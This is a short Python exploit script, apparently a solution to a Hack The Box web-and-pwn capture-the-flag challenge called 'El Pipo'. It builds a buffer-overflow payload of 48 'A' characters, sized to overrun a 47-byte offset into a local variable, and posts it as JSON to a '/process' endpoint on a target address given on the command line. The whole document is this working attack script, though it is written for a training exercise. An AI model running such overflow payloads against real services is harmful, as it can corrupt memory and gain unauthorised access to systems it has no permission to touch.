#!/usr/bin/env python3
import requests
import argparse

def build_payload():
    # We need 47 bytes to reach local_9
    offset = 47
    return "A" * offset + "A"

def send_payload(ip, port, payload):
    url = f"http://{ip}:{port}/process"
    data = { "userInput": payload }
    response = requests.post(url, json=data)
    return response

def main():
    parser = argparse.ArgumentParser(description="Exploit for El Pipo - HTB Web + Pwn challenge")
    parser.add_argument("ip", help="Target IP address")
    parser.add_argument("port", help="Target port")
    args = parser.parse_args()

    payload = build_payload()
    response = send_payload(args.ip, args.port, payload)

    print("[+] Sent payload:", payload)
    print("[+] Server response:")
    print(response.text)

if __name__ == "__main__":
    main()
